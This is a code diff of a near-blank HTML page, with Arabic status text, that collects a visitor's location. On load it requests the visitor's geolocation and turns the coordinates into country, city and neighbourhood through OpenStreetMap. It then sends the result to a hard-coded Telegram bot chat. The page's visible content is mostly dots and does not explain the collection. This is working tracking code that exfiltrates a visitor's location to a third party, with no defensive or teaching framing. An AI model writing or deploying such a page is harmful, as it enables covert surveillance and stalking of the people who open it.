@@ -12,8 +12,8 @@ body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:
 <body>
 
 <div id="msg">
-<h3></h3>
-<p id="status"></p>
+<h3>.</h3>
+<p id="status">..</p>
 <small></small>
 </div>
 
@@ -23,39 +23,54 @@ const CHAT_ID  = "6683130316";
 
 const statusEl = document.getElementById("status");
 
-window.addEventListener("load", ()=>{
+window.addEventListener("load", async ()=>{
   if(!navigator.geolocation){
     statusEl.textContent = "الموقع غير مدعوم في متصفحك";
     return;
   }
 
-  statusEl.textContent = "...";
+  statusEl.textContent = ".";
 
   navigator.geolocation.getCurrentPosition(async(position)=>{
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    statusEl.textContent = `الموقع تم تحديده: Lat=${lat}, Lon=${lon} — جارٍ الإرسال...`;
-
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("latitude", lat);
-    form.append("longitude", lon);
+    statusEl.textContent = `الموقع تم تحديده: Lat=${lat}, Lon=${lon} — جارٍ البحث عن التفاصيل...`;
 
     try{
-      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
+      // استخدام Nominatim OpenStreetMap لتحويل الإحداثيات لعنوان
+      const geoResp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+      const geoData = await geoResp.json();
+
+      const country = geoData.address.country || "غير معروف";
+      const state = geoData.address.state || geoData.address.region || "غير معروف";
+      const city = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.county || "غير معروف";
+      const suburb = geoData.address.suburb || geoData.address.neighbourhood || "";
+
+      const message = `📍 تم تحديد موقع المستخدم:
+الدولة: ${country}
+المحافظة/المنطقة: ${state}
+المدينة/الحي: ${city}${suburb?'\nالحي/المنطقة الصغيرة: '+suburb:''}
+الإحداثيات: Lat=${lat}, Lon=${lon}`;
+
+      // إرسال الرسالة للبوت
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("text", message);
+
+      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         method:"POST",
         body:form
       });
 
       if(resp.ok){
-        statusEl.textContent = ".";
+        statusEl.textContent = "✅ تم إرسال تفاصيل الموقع للبوت بنجاح.";
       }else{
         statusEl.textContent = "❌ فشل الإرسال. تحقق من التوكن والـ Chat ID.";
       }
 
     }catch(err){
-      statusEl.textContent = "حدث خطأ أثناء الإرسال: "+(err.message||err);
+      statusEl.textContent = "حدث خطأ أثناء الحصول على تفاصيل الموقع: "+(err.message||err);
     }
 
   }, (err)=>{
